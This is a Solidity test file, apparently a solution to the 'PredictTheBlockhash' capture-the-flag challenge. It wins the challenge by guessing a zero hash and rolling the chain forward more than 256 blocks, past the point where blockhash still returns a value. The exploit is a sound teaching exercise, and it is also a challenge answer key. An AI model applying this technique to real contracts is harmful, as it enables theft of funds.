// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;
    
    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
    }

    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;
        // Put your solution here
        // blockhash will return 0 for current block
        bytes32 guess = blockhash(blockNumber);
        predictTheBlockhash.lockInGuess{value: 1 ether}(guess);
        // blockhash does not work for blocks that are older than 256, it then returns a zero address
        vm.roll(blockNumber + 300);
        predictTheBlockhash.settle();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
